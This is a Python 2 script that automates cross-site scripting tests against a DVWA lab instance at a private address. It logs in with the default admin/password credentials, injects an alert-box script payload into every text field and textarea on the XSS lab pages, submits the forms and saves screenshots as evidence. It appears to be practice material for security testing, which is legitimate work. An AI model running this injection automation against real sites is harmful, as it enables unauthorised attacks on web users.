#!/usr/bin/env python
"""
💉 XSS Automator
Injects malicious scripts into forms to see if they execute.
Testing for Cross-Site Scripting! ☠️
"""

from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

class XSSAutomator:
    def __init__(self, target, base_url):
        self.target = target
        self.base_url = base_url
        self.email = "admin"
        self.password = "password"
        
        # 🎯 Targets
        self.target_paths = ["vulnerabilities/xss_r/", "vulnerabilities/xss_s/"]
        
        print "\n💉 XSS Automator Initialized!"
        print "   🎯 Target: " + self.target

    def login(self, browser):
        """Performs login."""
        print "\n   🔑 Logging in..."
        browser.get(self.target)
        try:
            browser.find_element_by_name("username").send_keys(self.email)
            browser.find_element_by_name("password").send_keys(self.password)
            
            browser.find_element_by_name("Login").click()
            print "   ✅ Login Clicked!"
            time.sleep(2)
        except Exception as e:
            print "   ❌ Login Error: " + str(e)
            browser.quit()

    def start_scan(self):
        try:
            # 👻 Start PhantomJS
            browser = webdriver.PhantomJS()
            self.login(browser)
            
            # 📸 Snapshot
            browser.save_screenshot('login_xss.png')
            print "   📸 Saved 'login_xss.png'"

            # 🍪 Process Links
            print "\n   🕷️ Crawling for attack vectors..."
            anchors = BeautifulSoup(browser.page_source, "html.parser").find_all("a")

            for i, link in enumerate(anchors):
                href = link.attrs.get("href", "")
                if not href: continue

                clean_href = href.replace("/.", "/")
                
                if clean_href in self.target_paths:
                    full_url = self.target + clean_href
                    print "\n   ⚔️ Attacking Page: " + full_url
                    
                    browser.get(full_url)
                    
                    # 📝 Find Forms
                    forms = BeautifulSoup(browser.page_source, "html.parser").find_all("form")
                    payload = "<script>alert('XSS')</script>" # Classic Payload 🦜
                    
                    for no, form in enumerate(forms):
                        print "      📝 Injecting Form #" + str(no+1)
                        
                        # 💉 Inject into TEXT/PASSWORD inputs
                        inputs = form.find_all("input")
                        submit_btn_name = ""
                        submit_btn_val = ""
                        
                        for inp in inputs:
                            inp_type = inp.attrs.get("type", "")
                            inp_name = inp.attrs.get("name", "")
                            
                            if inp_type in ["text", "password"]:
                                print "         💉 Injected payload into: " + inp_name
                                field = browser.find_element_by_name(inp_name)
                                field.clear()
                                field.send_keys(payload)
                            
                            elif inp_type in ["submit", "button"]:
                                submit_btn_name = inp_name
                                submit_btn_val = inp.attrs.get("value", "")

                        # 💉 Inject into TEXTAREAS
                        textareas = form.find_all("textarea")
                        for ta in textareas:
                             ta_name = ta.attrs.get("name", "")
                             print "         💉 Injected payload into TEXTAREA: " + ta_name
                             field = browser.find_element_by_name(ta_name)
                             field.clear()
                             field.send_keys(payload)

                        # 🚀 SUBMIT!
                        print "         🚀 Sending Payload..."
                        try:
                            if submit_btn_name:
                                browser.find_element_by_name(submit_btn_name).click()
                            elif submit_btn_val:
                                # CSS Selector fallback
                                css = '[value="' + submit_btn_val + '"]'
                                browser.find_element_by_css_selector(css).click()
                            else:
                                # Last resort: submit the form element itself if found?
                                # Simplified: just try finding any button
                                print "         ⚠️ Could not find exact submit button."
                            
                            # 📸 Evidence
                            evidence_file = "xss_evidence_" + str(i) + "_" + str(no) + ".png"
                            browser.save_screenshot(evidence_file)
                            print "         📸 Saved evidence: " + evidence_file
                            
                            # 🔙 Return to form page for next loop
                            browser.get(full_url)
                            
                        except Exception as e:
                            print "         ❌ Submit Error: " + str(e)

            print "\n✅ XSS Scan Complete!"
            browser.quit()

        except Exception as ex:
            print "   ❌ Critical Error: " + str(ex)

if __name__ == "__main__":
    target = "http://192.168.250.1/dvwa/"
    base = "http://192.168.250.1/"
    bot = XSSAutomator(target, base)
    bot.start_scan()
